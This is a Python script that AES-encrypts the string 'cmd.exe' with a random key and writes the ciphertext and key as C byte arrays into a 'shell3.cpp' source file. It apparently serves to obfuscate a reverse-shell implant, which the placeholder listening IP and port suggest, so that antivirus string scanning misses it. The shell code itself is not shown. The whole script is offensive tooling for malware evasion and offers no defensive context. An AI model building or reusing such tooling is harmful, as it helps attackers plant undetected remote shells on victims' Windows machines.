from Crypto.Cipher import AES
from os import urandom
import sys, os, hashlib

def pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def convert(data):
    output_str = ""
    for i in range(len(data)):
        current = data[i]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += hex(ordd(current))
    return output_str.split("0x")


def AESEncrypt(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * '\x00'
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv.encode("UTF-8"))
    ciphertext = cipher.encrypt(plaintext.encode("UTF-8"))
    ciphertext, key =  convert(ciphertext), convert(key)
    ciphertext = '{' + (' 0x'.join(x+ "," for x in ciphertext)).strip(",") + ' };'
    key = '{' + (' 0x'.join(x + "," for x in key)).strip(",") + ' };' 
    return ciphertext,key

my_secret_key = urandom(16)
ip, port = "listening ip", "listening port"

plaintext = "cmd.exe"
ciphertext, key = AESEncrypt(plaintext, my_secret_key)

##open and replace
tmp = open("shell3.cpp", "rt")
data = tmp.read()
data = data.replace('unsigned char myCmd[] = { };', 'unsigned char myCmd[] = ' + ciphertext)
data = data.replace('unsigned char mySecretKey[] = { };', 'unsigned char mySecretKey[] = ' + key)
tmp.close()
tmp = open("shell3_updated.cpp", "w+")
tmp.write(data)
tmp.close()
